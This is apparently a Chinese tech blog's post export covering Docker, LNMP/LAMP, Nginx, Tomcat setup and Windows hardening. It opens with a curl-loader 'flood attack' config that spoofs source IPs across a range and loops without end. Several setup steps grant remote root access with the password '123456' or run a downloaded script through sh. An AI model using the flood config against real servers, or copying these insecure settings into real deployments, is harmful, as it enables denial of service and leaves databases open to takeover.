[{"title":"Curl_loader 泛洪攻击","url":"/2023/07/20/curl_loader泛洪攻击/","content":"\n1、安装过程\n\n下载链接 ：https://master.dl.sourceforge.net/project/curl-loader/curl-loader/curl-loader-0.56/curl-loader-0.56.tar.bz2?viasf=1\n\n安装依赖\n\n```\nyum install openssl -y\nyum install openssl-devel -y\n```\n\n解压并make\n\n```\ntar -xjf curl-loader-0.56.tar.bz2\ncd curl-loader-0.56\nmake\n```\n\n2、使用步骤\n\n配置文件  示例  参考链接：https://curl-loader.sourceforge.net/doc/faq.html\n\n```\n10k.conf\n########### GENERAL SECTION ################################\nBATCH_NAME= 10K        # 名称\nCLIENTS_NUM_MAX=10000  # 最大一万个客户端\nCLIENTS_NUM_START=100  # 从100个客户端开始\nCLIENTS_RAMPUP_INC=50  # 每次增加50\nINTERFACE   =eth0   # 网卡\nNETMASK=16         # 掩码\nIP_ADDR_MIN= 192.168.1.1    # 伪装的IP起始\nIP_ADDR_MAX= 192.168.53.255  #Actually - this is for self-control\nCYCLES_NUM= -1   # 循环次数 -1代表无限循环\nURLS_NUM= 1      # URL的数量\n\n########### URL SECTION ####################################\n\nURL=http://localhost/index.html\n#URL=http://localhost/ACE-INSTALL.html\nURL_SHORT_NAME=\"local-index\"\nREQUEST_TYPE=GET\nTIMER_URL_COMPLETION = 5000      # In msec. When positive, Now it is enforced by cancelling url fetch on timeout\nTIMER_AFTER_URL_SLEEP =20   # 请求发的间歇\n```\n\n使用命令\n\n```\n./curl-loader -f test.conf\n```\n\n![image-20230722085029392](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230722085029392.png)\n\n![image-20230722085048540](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230722085048540.png)\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"Docker环境","url":"/2023/07/13/Docker环境/","content":"\n\n\n#### 1、Docker基本概念\n\n一个非常轻量级的虚拟环境，没有独立IP，依赖于宿主机。 Docker之间可以互相通信。外部设备无法访问Docker，必须把端口映射给宿主机。\n\n注意事项：\n\n- 尽量让一个容器做一件事情\n- 尽量使用挂载的方式把数据文件挂载到容器中\n- 尽量不要使用交互环境来直接操作容器，而是在宿主机上执行命令。\n\n#### 2、Docker 环境安装\n\n```\nyum install -y net-tools\nyum install -y yum-utils device-mapper-persistent-data lvm2\nyum-config-manager --add-rep http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo\nyum makecache fast\nyum install -y docker-ce\nsystemctl start docker\n```\n\n#### 3、配置拉取的镜像源\n\n```shell\nvim/etc/docker/daemon.json \n添加\n{\n    \"registry-mirrors\":[\n     \"https://registry.docker-cn.com\",\n     \"http://hub-mirror.c.163.com\",\n     \"https://docker.mirrors.ustc.edu.cn\"\n     ]\n}\n```\n\n运行docker info\n\n![image-20230711224747265](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230711224747265.png)\n\n#### 4、相关官方站点\n\nhttps://hub.docker.com\n\nhttps://hub.daocloud.io/\n\n#### 5、搜索和拉取镜像\n\n```\n# 搜索特定镜像\ndocker search centos\n# 拉取特定镜像\ndocker pull centos \n# 查看当前有多少镜像\ndocker images\n# 创建容器  以交互式创建，映射docker里的3306到宿主机3307端口，容器名称centos_mysql,主机名 my_mysql\n[root@192 ~]# docker create -it --name centos_mysql -h my_mysql -p 3307:3306 centos:latest\nc22489a7c38c70632e117a327647278bffc332e96c8300c7fbaebcec78bff052\n# 查看当前容器\n[root@192 ~]# docker container ls -a\nCONTAINER ID   IMAGE           COMMAND       CREATED         STATUS    PORTS     NAMES\nc22489a7c38c   centos:latest   \"/bin/bash\"   2 minutes ago   Created             centos_mysql\n# 运行\n[root@192 ~]# docker start centos_mysql\ncentos_mysql\n[root@192 ~]# docker ps\nCONTAINER ID   IMAGE           COMMAND       CREATED         STATUS         PORTS                                       NAMES\nc22489a7c38c   centos:latest   \"/bin/bash\"   4 minutes ago   Up 3 seconds   0.0.0.0:3307->3306/tcp, :::3307->3306/tcp   centos_mysql\n# 执行\n[root@192 ~]# docker exec -it centos_mysql  /bin/bash\n[root@my_mysql /]#      \n\n# 创建并运行\ndocker run -it --name centos_mysql -h my_mysql -p 3307:3306 centos:latest\n\n# 特权模式下创建容器\ndocker create -ti --name centos_mysql --privileged=true -h my_mysql -p 3307:3306 centos:latest /sbin/init\n\n```\n\n- 失败的情况\n\n​\t\t查看docker 中yum 源，发现yum list 失败，\n\n```\n[root@my_mysql /]# yum list\nFailed to set locale, defaulting to C.UTF-8\nCentOS Linux 8 - AppStream                                                                 66  B/s |  38  B     00:00    \nError: Failed to download metadata for repo 'appstream': Cannot prepare internal mirrorlist: No URLs in mirrorlist\n```\n\n​\t\t可以运行以下命令\n\n```\ncd /etc/yum.repos.d/\nsed -i 's/mirrorlist/#mirrorlist/g' /etc/yum.repos.d/CentOS-*\nsed -i 's|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g' /etc/yum.repos.d/CentOS-*\nyum update -y\n```\n\n#### 6、示例安装 Tomcat + Mysql 服务\n\n- 安装Mydql\n\n  ```shell\n  # 拉取centos7镜像\n  docker pull couchbase/centos7-systemd\n  # 以特权模式创建容器，可以使用systemctl\n  docker create -ti --name centos_7 --privileged=true -h my_mysql -p 3307:3306 couchbase/centos7-systemd /sbin/init\n  # 进入到容器\n  docker exec -it centos_7 /bin/bash\n  # 下载mysql的rpm\n  wget http://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm\n  # 安装源\n  rpm ivh mysql57-community-release-el7-11.noarch.rpm \n  # 编辑源，启用mysql5.6 enabled=1  取消mysql5.7\n  vim /etc/yum.repos.d/mysql-community.repo \n  # 安装mysql5.6\n  yum install mysql-server\n  systemctl start mysqld\n  # 创建远程登录用户\n  mysql -uroot\n  GRANT ALL PRIVILEGES ON *.* TO 'client'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;\n  flush privileges;\n  systemctl restart mysqld;\n  # 此时可以用navicat 连接宿主机3307端口即为连接到docker 容器的3306端口，即mysql服务。\n  ```\n\n  \n\n- 安装java1.8 \n\n  ```shell\n  #拷贝到docker \n  docker cp jdk1.8.0_211.tar.gz centos_7:/opt\n  tar -xzf jdk1.8.0_211.tar.gz\n  编辑 ~/.bash_profile\n  export JAVA_HOME=/opt/jdk1.8.0_211\n  PATH=$PATH:$HOME/bin:$JAVA_HOME/bin\n  # 生效\n  source .bash_profile\n  ```\n\n  \n\n- 安装Tomcat\n\n  ```shell\n  docker cp ./apache-tomcat-8.5.90.tar.gz  centos_7:/opt\n  cd /opt\n  tar xzvf apache-tomcat-8.5.90.tar.gz\n  echo 'export CATALINA_HOME=/opt/apache-tomcat-8.5.90' >> ~/.bashrc\n  echo 'export PATH=$CATALINA_HOME/bin:$PATH' >> ~/.bashrc\n  source ~/.bashrc\n  \n  # 防火墙\n  firewall-cmd --add-port=8080/tcp --permanent\n  # 启动\n  $CATALINA_HOME/bin/startup.sh\n  ```\n\n- 修改数据库连接，复制站点等\n\n#### 7、镜像保存、归档、压缩、还原\n\n```\n# 镜像保存\ndocker commit -a \"author\" -m \"description\"  容器名称（centos_7） 镜像名字\n# 归档、压缩\ndocker save -o /opt/xxx.tar 镜像名字\ngzip xxx.tar\n# 还原\ndocker load -i xxx.tar.gz\n```\n\n#### 8、挂载\n\n```shell\n# 创建容器的时候，-v 选项指定挂载的目录，修改宿主机的文件即为修改容器里面的文件\ndocker create -it -name xxx -v /opt/xxx:/opt/xxx  镜像名\n```\n\n\n\n#### 8、注意事项\n\n- docker stop 以后 再启动   .bash_profile 未生效，因此可以将一些命令写入到 /etc/bashrc   或者 ~/.bashrc，或者直接写入/etc/rc.d/rc.local ，可以实现在docker 启动时就执行\n\n  ```\n  /etc/rc.d/rc.local 系统启动时执行 /etc/rc.local 是其软连接文件\n  /etc/profile       登录时执行\n  /etc/bashrc        运行bash shell时执行\n  ~/.bash_profile    用户登陆时执行\n  ~/.bashrc          用户登陆以及打开bash shell 时执行\n  ~/.bash_logout     用户退出登录时执行\n  ```\n\n#### 9、dockfile 构建镜像\n\nDockerFile是用来构建Docker镜像的构建文件，是由一系列命令和参数构成的脚本。\n\n全自动化的拉取镜像，执行一系列指令，从而生成对应的镜像。\n","tags":["web"],"categories":["web"]},{"title":"LNMP环境（支持LUA）","url":"/2023/07/11/LNMP环境安装/","content":"\n#### 1、安装Mysql5.7\n\n-  配置Mysql 的yum 源 CentOS 的yum源中没有mysql，需要到mysql的官网下载yum repo配置文件\n\n```\n# 下载安装\nwget http://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm\nrpm -ivh mysql57-community-release-el7-11.noarch.rpm \nrpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022\nyum -y install mysql-server\n\n# 查看mysqld 服务是否存在并启动\nsystemctl start mysql\nsystemctl status mysqld\n\n# 获取临时密码（mysql5.7才有，5.6默认密码为空）\ncat /var/log/mysqld.log |grep password\n2023-07-06T14:49:50.366809Z 1 [Note] A temporary password is generated for root@localhost: wF4t6oiiju)o\n# 更改密码\nALTER USER 'root'@'localhost' IDENTIFIED BY 'Qwer1234@';\n\n```\n\n- 查看默认密码策略\n\n![image-20230706225840203](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230706225840203.png)\n\n如需关闭密码策略，在/etc/my.cnf 中添加\n\nvalidate_password= off\n\n- 创建数据库和账号\n\n  ```\n  # 创建数据库\n  mysql> create database web_site character set utf8 collate utf8_general_ci;\n  Query OK, 1 row affected (0.00 sec)\n  # 创建用户\n  mysql> create user john@'%' identified by 'Asdf1234@';\n  Query OK, 0 rows affected (0.00 sec)\n  # 授权用户用于该数据库的所有表的权限\n  mysql> grant all privileges on web_site.* to john@'%';\n  Query OK, 0 rows affected (0.00 sec)\n  # 查看用户是否添加成功\n  mysql> use mysql;\n  Reading table information for completion of table and column names\n  You can turn off this feature to get a quicker startup with -A\n  \n  Database changed\n  mysql> select User,Host,authentication_string from user;\n  +---------------+-----------+-------------------------------------------+\n  | User          | Host      | authentication_string                     |\n  +---------------+-----------+-------------------------------------------+\n  | root          | localhost | *F393111FF4D128DBA783646EDBD577DC15DEBE40 |\n  | mysql.session | localhost | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |\n  | mysql.sys     | localhost | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |\n  | john          | %         | *C244E5730489A669785440CA0861C36379D08029 |\n  +---------------+-----------+-------------------------------------------+\n  4 rows in set (0.00 sec)\n  ```\n\n  \n\n#### 2、php7.3 源码安装\n\n- 安装依赖库\n\n  ```shell\n  yum install -y gcc gcc-c++ make sudo autoconf libtool-ltdl-devel gd-devel freetype-devel libxml2-devel libjpeg-devel libpng-devel curl-devel patch ncurses-devel bzip2 libcap-devel ntp diffutils sendmail iptables unzip cmake pcre-devel zlib-devel openssl openssl-devel libmcrypt-devel libmhash-devel sysklogd\n  \n  # 其中libmcrypt-devel libmhash-devel 安装失败\n  解决办法\n  1、安装第三方yum源\n  wget http://www.atomicorp.com/installers/atomic\n  sh ./atomic\n  2、使用yum命令安装\n  yum  install  libmcrypt-devel libmhash-devel\n  \n  # sysklogd 安装失败，说是在较新的 Linux 发行版中，rsyslog 已经取代了 sysklogd，就没管了\n  ```\n\n- 创建用户和组\n\n  ```\n  [root@192 ~]# groupadd www\n  [root@192 ~]# useradd -r www -g www\n  ```\n\n- 安装\n\n```\n./configure --prefix=/usr/local/php --enable-fpm --with-fpm-user=www --with-fpm-group=www --with-openssl --with-libxml-dir --with-zlib --enable-mbstring --with-mysqli=mysqlnd --enable-mysqlnd --with-pdo-mysql=mysqlnd --with-gd --with-jpeg-dir --with-png-dir --with-zlib-dir --with-freetype-dir --enable-sockets --with-curl --enable-maintainer-zts \n\nmake \nmake install\n```\n\n- 配置PHP环境\n\n  ```\n  cd /usr/local/php/\n  cp etc/php-fpm.conf.default etc/php-fpm.conf\n  cp etc/php-fpm.d/www.conf.default etc/php-fpm.d/www.conf\n  cp /root/php-7.3.32/php.ini-production lib/php.ini\n  /usr/local/php/sbin/php-fpm \n  \n  \n  [root@192 php]# netstat -anplt\n  Active Internet connections (servers and established)\n  Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \n  tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      110017/php-fpm: mas \n  ```\n\n  开启php-fp, 启动9000进行监听，获取从Nignx发送过来的处理请求。\n\n#### 3、安装Nginx（支持LUA）\n\n（注意各个版本，所使用的版本不同可能最后编译失败）\n\n- 安装LuaJIT\n\n  ```shell\n  cd /opt/\n  wget http://luajit.org/download/LuaJIT-2.0.5.tar.gz\n  tar -zxf LuaJIT-2.0.5.tar.gz \n  cd LuaJIT-2.0.5/\n  make && make install\n  ```\n\n- 安装ngx_devel_kit\n\n  ```shell\n  #下载链接\n  https://github.com/vision5/ngx_devel_kit/archive/refs/tags/v0.3.2.tar.gz\n  拷贝到/opt 目录\n  cd /opt\n  tar -zxvf ngx_devel_kit-0.3.2.tar.gz\n  ```\n\n- 安装nginx_lua_module\n\n  ```\n  # 下载链接\n  https://github.com/openresty/lua-nginx-module/archive/refs/tags/v0.10.13.tar.gz\n  拷贝到/opt目录\n  cd /opt\n  tar -zxf lua-nginx-module-0.10.13.tar.gz\n  ```\n\n- 导入环境变量\n\n  ```shell\n  vim /etc/profile\n  # 添加到末尾\n  export LUAJIT_LIB=/usr/local/lib\n  export LUAJIT_INC=/usr/local/include/luajit-2.0\n  ```\n\n- 安装nginx\n\n  ```\n  tar -zxf nginx-1.22.1.tar.gz \n  cd nginx-1.22.1/\n  ./configure --user=www --group=www --prefix=/usr/local/nginx --with-http_stub_status_module --with-http_ssl_module --with-http_gzip_static_module --pid-path=/usr/local/nginx/nginx.pid --with-http_realip_module --add-module=/opt/ngx_devel_kit-0.3.2 --add-module=/opt/lua-nginx-module-0.10.13 --with-ld-opt=\"-Wl,-rpath,$LUAJIT_LIB\"\n  make -j2 && make install\n  firewall-cmd --add-port=80/tcp --permanent\n  /usr/local/nginx/sbin/nginx\n  ```\n\n  环境安装基本结束\n\n#### 4、配置站点\n\n- 1、创建文件夹存放站点\n\n- 2、递归修改所有的目录所有者,文件所有者为www\n\n- 3、修改数据库连接信息\n\n- 4、修改nginx.conf ，配置网站根目录，取消location 注释等，根据实际情况修改。\n\n![image-20230710215441928](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230710215441928.png)\n\n- 5、配置thinkphp的URL地址重写，修改nginx.conf 。\n\n","tags":["web"],"categories":["web"]},{"title":"Nginx","url":"/2023/07/03/Nginx_new/","content":"\n\n### Nginx\n\n 1、概念\n\n轻量应用服务器、高并发\n\n2、反向代理与正向代理\n\n正向代理示意图\n\n![image-20230703214801703](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230703214801703.png)\n\n作用：\n\n- 访问无法访问的资源如Google\n- 做缓存，加速访问资源，如CDN\n- 对客户端进行访问授权，上网认证\n- 记录用户访问记录，上网行为管理\n\n反向代理\n\n![image-20230703215040740](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230703215040740.png)\n\n- 保证内网的安全，阻止web攻击，大型网站，通常将反向代理作为公网访问地址，Web服务器是内网\n- 负载均衡，通过反向代理来优化网站的负载\n- 故障转移\n\n3、安装\n\n```\nwget http://nginx.org/download/nginx-1.25.1.tar.gz\ntar -zxvf nginx-1.25.1.tar.gz \ncd nginx-1.25.1/\nyum -y install gcc pcre-devel zlib-devel openssl openssl-devel\n./configure --prefix=/usr/local/nginx --with-http_ssl_module\nmake\nmake install\n[root@192 nginx-1.25.1]# whereis nginx\nnginx: /usr/local/nginx\n/usr/local/nginx/sbin/nginx \n```\n\n4、nginx 连接Tomcat  (单节点配置)\n\n![image-20230703223223518](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230703223223518.png)\n\n正常站点还要添加另一个location\n\n```\nlocation /website/{\n\tproxy_pass http:mytomcat/website/;\n\tproxy_redirect default;\n}\n```\n\n此时访问 http://192.168.101.10:80（nginx） 即为访问http://192.168.101.10:8080（Tomcat）\n\n多节点新增Server即可。增加ip_hash ;保证同一个IP只分配同一个节点。\n\n```\nupstream mytomcat{\n        ip_hash ;\n        # 指定Tomcat的服务器IP地址 端口以及权重\n        server 192.168.101.10:8080 weight=1;\n        server 192.168.101.11:8080 weight=1;\n     }\n```\n\n","tags":["web"],"categories":["web"]},{"title":"Java_Tomcat环境","url":"/2023/06/27/Java_Tomcat环境_new/","content":"\n\n### Java_Tomcat环境\n\n\n\nTomcat 核心功能是作为Java的容器来运行Java的后台代码，并内置对HTTP请求的处理，但不是最优选择，前面往往加一个Apache或者Nigix 处理HTTP请求。\n\n1、 单独安装Mysql5.6环境\n\n```\nwget http://repo.mysql.com/mysql-community-release-el6-5.noarch.rpm\nyum list installed | grep mysql\nrpm -qa|grep -i mariadb\nrpm -qa|grep mariadb|xargs rpm -e --nodeps\nrpm -qa|grep -i mariadb\nrpm -ivh mysql-community-release-el6-5.noarch.rpm\nyum repolist all | grep mysql\nyum install mysql-community-server\nsystemctl status mysqld\nsystemctl start mysqld\nsystemctl status mysqld\nmysql -uroot\n    use mysql;\n    UPDATE user SET Password=PASSWORD('123456') WHERE User='root';\n    GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;\n    FLUSH privileges;\n\nsystectl restart mysqld\n\n# 如果不小心改错了,以不验证模式启动Mysql\nsystemctl stop mysqld\nmysqld_safe --skip-grant-tables  \n随后登录，更改\n\n```\n\n2 .安装Tomcat 8.5 (java 已安装)\n\n下载链接 https://tomcat.apache.org/download-80.cgi\n\n```shell\ntar xzvf apache-tomcat-8.5.90.tar.gz\nmv apache-tomcat-8.5.90 /opt\necho 'export CATALINA_HOME=/opt/apache-tomcat-8.5.90' >> ~/.bashrc\necho 'export PATH=$CATALINA_HOME/bin:$PATH' >> ~/.bashrc\nsource ~/.bashrc\n\n# 防火墙\nfirewall-cmd --add-port=8080/tcp --permanent\n# 启动\n$CATALINA_HOME/bin/startup.sh\n\n# 默认配置文件\n/opt/apache-tomcat-8.5.90/conf/server.xml\n\n#默认日志文件\n/opt/apache-tomcat-8.5.90/log/catalina.out\n\n#访问日志文件\n/opt/apache-tomcat-8.5.90/log/localhost_access_log.2023-06-27.txt\n```\n\n默认网站根目录如下\n\n![image-20230627232003484](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230627232003484.png)\n\n数据库连接文件\n\n修改对应的网站的数据库连接情况，导入数据库，\n\n3、配置HTTPS\n\n```\n[root@192 apache-tomcat-8.5.90]# keytool -genkeypair -alias \"tomcat\" -keyalg \"RSA\" -keystore \"/opt/tomcat.keystore\"\nEnter keystore password:  \nRe-enter new password: \nWhat is your first and last name?\n  [Unknown]:  jie\nWhat is the name of your organizational unit?\n  [Unknown]:  360\nWhat is the name of your organization?\n  [Unknown]:  360\nWhat is the name of your City or Locality?\n  [Unknown]:  chengdu\nWhat is the name of your State or Province?\n  [Unknown]:  sichuan\nWhat is the two-letter country code for this unit?\n  [Unknown]:  cn\nIs CN=jie, OU=360, O=360, L=chengdu, ST=sichuan, C=cn correct?\n  [no]:  yes\n\nEnter key password for <tomcat>\n        (RETURN if same as keystore password):  \nRe-enter new password: \n\nWarning:\nThe JKS keystore uses a proprietary format. It is recommended to migrate to PKCS12 which is an industry standard format using \"keytool -importkeystore -srckeystore /opt/tomcat.keystore -destkeystore /opt/tomcat.keystore -deststoretype pkcs12\".\n[root@192 apache-tomcat-8.5.90]# keytool -importkeystore -srckeystore /opt/tomcat.keystore -destkeystore /opt/tomcat.keystore -deststoretype pkcs12\"\n> ^C\n[root@192 apache-tomcat-8.5.90]# keytool -importkeystore -srckeystore /opt/tomcat.keystore -destkeystore /opt/tomcat.keystore -deststoretype pkcs12\nEnter source keystore password:  \nEntry for alias tomcat successfully imported.\nImport command completed:  1 entries successfully imported, 0 entries failed or cancelled\n\nWarning:\nMigrated \"/opt/tomcat.keystore\" to Non JKS/JCEKS. The JKS keystore is backed up as \"/opt/tomcat.keystore.old\".\n\n\n接着更改配置文件conf/server.xml\n\n    <Connector port=\"8443\" protocol=\"org.apache.coyote.http11.Http11NioProtocol\"\n               maxThreads=\"150\" SSLEnabled=\"true\"\n               maxParameterCount=\"1000\"\n               keystoreFile=\"/opt/tomcat.keystore\" keystorePass=\"123456\"\n               >\n        <SSLHostConfig>\n            <Certificate certificateKeystoreFile=\"conf/localhost-rsa.jks\"\n                         type=\"RSA\" />\n        </SSLHostConfig>\n    </Connector>\n\n\n```\n\n","tags":["web"],"categories":["web"]},{"title":"LAMP环境","url":"/2023/06/24/LAMP环境_new/","content":"\n\n### Lampp环境\n\n1、基本概念与环境\n\nLinux+apache2+mysql+php+python\n\nXmapp 是集合了LAMPP 的完整的运行环境，相对来说适用于开发和调试，但是安全性配置不足，相对而言漏洞较多。\n\n- Xmapp 启动后，Apache 使用端口80，防火墙要放行\n\n```shell\nfirewall-cmd  --add-port=80/tcp  --permanant\n```\n\n- http://ip/dashboard/phpinfo.php 展示了所有运行环境参数，通常情况下，***配置完成后要删除该页面***\n\n- 默认情况下，/opt/lampp/htdocs 目录是应用程序的根目录。\n\n- phpmyadmin 是mysql的网页端，***默认情况下禁止远程访问***\n\n  ```shell\n  # 修改/opt/lampp/etc/extra/httpd-xampp.conf \n  # 注释  Require local  新增  Require all granted 即可运行远程访问\n  # since XAMPP 1.4.3\n  <Directory \"/opt/lampp/phpmyadmin\">\n      AllowOverride AuthConfig Limit\n      # Require local\n      Require all granted\n      ErrorDocument 403 /error/XAMPP_FORBIDDEN.html.var\n  </Directory>\n  ```\n\n- 确认服务和端口正常启动\n\n  - 修改默认端口，修改配置文件/opt/lampp/etc/httpd.conf，***改成非80，更安全***\n\n  - 如果出现内核版本不兼容情况，修改/opt/lampp/lampp ，将内核版本修改为2.8.0以上。\n\n  ```shell\n  LD_ASSUME_KERNEL=2.8.0\n  ```\n\n- 部署对应的系统或者网站，导入数据库，修改配置文件等。\n\n  注意配置数据库时\n\n  - 修改root默认密码\n  - 配置phpmyadmin 允许远程访问，或者设置一个可以远程访问的用户，然后用navicat连接进行配置\n\n  ```\n  默认数据库的user情况\n  MariaDB [mysql]> select User,Password,Host from user;\n  +------+----------+-----------+\n  | User | Password | Host      |\n  +------+----------+-----------+\n  | root |          | localhost |\n  | root |          | 127.0.0.1 |\n  | root |          | ::1       |\n  |      |          | localhost |\n  | root |          | %         |\n  | pma  |          | localhost\n  \n  第一行：用户名为 root，密码为空白，允许从 localhost 发起连接请求，不需要密码。\n  第二行：用户名为 root，密码为空白，允许从 127.0.0.1 发起连接请求，不需要密码。\n  第三行：用户名为 root，密码为空白，允许从 ::1 发起连接请求，不需要密码。\n  第四行：用户名为空白，密码为空白，允许从 localhost 发起连接请求。这行数据有些特殊，因为它可以允许任何人以匿名身份登录，不需要密码。\n  第五行：用户名为 root，密码为空白，允许从任意主机（%）发起连接请求。注意，在使用通配符 % 时需要小心，因为这样很可能导致安全漏洞，不需要密码。\n  第六行：用户名为 pma，密码为空白，允许从 localhost 发起连接请求。pma 是 phpMyAdmin 中默认创建的一个用户，用于管理 MySQL 数据库，不需要密码。\n  ```\n\n  \n  \n  两种方式修改mysql的密码：\n  \n  第一种方式：\n  \n  phpmyadmin 点击修改权限，找到change password, 添加密码，然后修改phpmyadmin/config.inc.php\n  \n  ```\n  $cfg['Servers'][$i]['password'] = '654321';\n  ```\n  \n  ![image-20230625225559571](https://raw.githubusercontent.com/scuzhangzhang/pic/main/img/image-20230625225559571.png)\n  \n  第二种方式，默认空密码登陆后\n  \n  ```mysql\n  mysql -uroot \n  update user set authentication_string=password('qwe123') where user='root' and host='localhost';\n  update user set authentication_string=password('qwe123') where user='root' and host='127.0.0.1';\n  update user set authentication_string=password('xxxxxx') where user='root' and host='%';\n  flush privileges\n  \n  而不是下面的语句\n  update user set password='qwe123' where user='root' and host='localhost';\n  ```\n\n注意如果密码出错，无法登录进去的话，可以修改my.cnf 加入\n\n```shell\nskip-grant-tables\n```\n\n\n\n***安全起见，一般要禁用phpmyadmin***，有三种方法\n\n1、设置访问密码，更改PhpMyadmin的默认config 模式为cookie模式\n\n```\n使用cookie授权模式 将'auth_type'改为'cookie'，然后修改'blowfish_secret'用一个任意字符串作为cookie的加密字符串，如果没有加密钥匙,系统会显示\"配置文件现在需要绝密的短语密码(blowfish_secret) \" ,配置文件如下:\n\n$cfg['Servers'][$i]['auth_type'] = 'cookie'; $cfg['blowfish_secret'] = '44e2f5aece2855.93921574';\n```\n\n2、禁用phpMyadmin，在httpd.conf  注释掉http-xmapp.conf的包含目录，删除phpmyadmin\n\n3、管理数据库，使用数据库，phpmyadmin 放在另一个服务器上之类的\n\n4、使用knock 进行端口隐藏，使用时再打开\n\n***其他注意事项***\n\n1、任何一个URL地址，一定要指定到具体的文件，如果没有指定，访问默认首页\n\n如 httpd.conf \n\n```shell\nDirectoryIndex index.html index.html.var index.php index.php3 index.php4\n```\n\n默认下，任何一个目录，如果只输入目录名而不输入文件名去访问，该目录必须要有一个默认主文件，比如index.html。index.php ，index.jsp  default.php  main.php 否则将无法访问到该页面，***不然就是明显的安全漏洞***，如目录浏览\n\n2、***为了防止目录浏览，还可以修改httpd.conf ，修改options*** \n\n```shell\nOptions Indexes FollowSymLinks ExecCGI Includes\n改成Options None\n```\n\n","tags":["web"],"categories":["web"]},{"title":"windows 服务器加固技术","url":"/2023/06/11/windows 服务器加固技术_new/","content":"\n            \n###  Windows 服务器加固技术\n\n#### 1、windows 常用命令\n\n| **命令**                         | **说明**                                |\n| -------------------------------- | --------------------------------------- |\n| ver                              | 查看系统版本                            |\n| hostname                         | 查看主机名                              |\n| ipconfig /all                    | 查看网络配置                            |\n| net user/localgroup/share/config | 查看用户/用户组/共享/当前运行可配置服务 |\n| at                               | 建立或查看系统作业                      |\n| netstat                          | 查看开放端口                            |\n| secpol.msc                       | 查看和修改本地安全设置                  |\n| services.msc                     | 查看和修改服务                          |\n| eventvwr.msc                     | 查看日志                                |\n| regedit                          | 打开注册表                              |\n| whoami                           | 查看当前操作用户的用户名                |\n\n- 修改本地安全策略\n\n  账户策略\n\n  - 密码策略\n  - 账户锁定策略\n\n  本地策略\n\n  - 审核策略\t  -记录成日志\n\n  - 用户权限分配  \n\n  - 安全选项\n\n#### 2、windows 常见端口\n\n| **端口**     | **说明**                                  |\n| ------------ | ----------------------------------------- |\n| 80/8080/8081 | HTTP协议代理服务器常用端口号              |\n| 443          | HTTPS协议代理服务器常用端口号             |\n| 21           | FTP(文件传输协议)协议代理服务器常用端口号 |\n| 23           | Telnet(远程登录)协议代理服务器常用端口号  |\n| 22           | SSH（安全登录）、SCP（文件传输）          |\n| 1521         | Oracle 数据库                             |\n| 1433         | MS SQL SERVER数据库                       |\n| 1080         | QQ                                        |\n| 3306         | Mysql数据库                               |\n| 25           | SMTP（简单邮件传输协议）                  |\n\n#### 3、windows账号及安全策略\n\n  windows+R  secpol.msc \n\n- 账号策略\n\n```\n密码必须符合复杂性要求：启用 \n密码长度最小值         8个字符 \n密码最长使用期限：       30天 \n强制密码历史：         3个记住的密码\n```\n\n- 账号锁定\n\n```\n帐户锁定阀值：         3次无效登陆\n帐户锁定时间：         30分钟 \n复位帐户锁定计数器：30分钟之后\n```\n\n- Administrator账号  组重命名\n\n  `Win + R` 键，然后输入 `compmgmt.msc` 命令打开计算机管理\n\n  ```shell\n  wmic useraccount where name='Administor' call Rename admin\n  ```\n\n- 禁用Guest账户\n\n#### 4、日志以及审核策略\n\n-    windows+R  secpol.msc     本地策略->审核策略\n\n```\n审核策略更改         成功，失败 \n审核登陆事件         成功，失败\n审核对象访问         失败   \n审核目录服务访问   失败 \n审核特权使用        失败   \n审核系统事件         成功，失败  \n审核账户登陆事件   成功，失败  \n审核帐户管理        成功，失败 \n```\n\n- 更改日志大小\n\n  eventvwr.msc\n\n  ```\n  日志类型        日志大小    覆盖策略\n  应用程序        80000KB    覆盖早于30天的日志\n  安全日志        80000KB    覆盖早于30天的日志\n  系统日志        80000KB    覆盖早于30天的日志\n  ```\n\n  \n\n#### 5、安全选项\n\n本地安全策略->本地策略->安全选项\n\n- Microsoft 网络服务器：当登录时间用完时自动注销用户（启用）\n\n目的：可以避免用户在不适合的时间登录到系统,或者用户登录到系统后忘记退出登录\n\n- Microsoft 网络服务器：在挂起会话之前所需的空闲时间（小于等于30分钟）\n\n目的：设置挂起会话之前所需的空闲时间为30分钟\n\n- Microsoft 网络客户端：发送未加密的密码到第三方SMB服务器（禁用）\n\n目的：禁止发送未加密的密码到第三方SMB服务器\n\n- 故障恢复控制台:允许对所有驱动器和文件夹进行软盘复制和访问（禁用）\n\n目的：禁止它访问硬盘驱动器上的所有文件和目录。它仅允许访问每个卷的根目录%systemroot%目\n录及子目录，即使是这样它还限制不允许把硬盘驱动器上的文件拷贝到软盘上\n\n- 故障恢复控 制台:允许自动系统管理级登录（禁用）\n\n目的：恢复控制台是Windows 2003的一个新特性，它在一个不能启动的系统上给出一个受限的命令行访问界面。可能会导致任何可以重起系统的人绕过账号口令限制和其它安全设置而访问系统\n\n- 关机：清除虚拟内存页面文件（启用）\n\n目的：某些第三方的程序可能把一些没有的加密的密码存在内存中，页面文件中也可能含有另外一些敏感的资料。关机的时候清除页面文件，防止造成意外的信息泄漏\n\n- 关机：允许系统在未登录前关机（禁用）\n\n目的：在未登录前不能关闭计算机\n\n- 交互式登录：不显示上次的用户名（启用）\n\n目的：登陆时不显示上次的用户名，防止暴露用户名。\n\n- 交互式登录：不需要按Ctrl+Alt+Del（禁用）\n\n目的：登录时需要按CTRL+ALT+DEL\n\n- 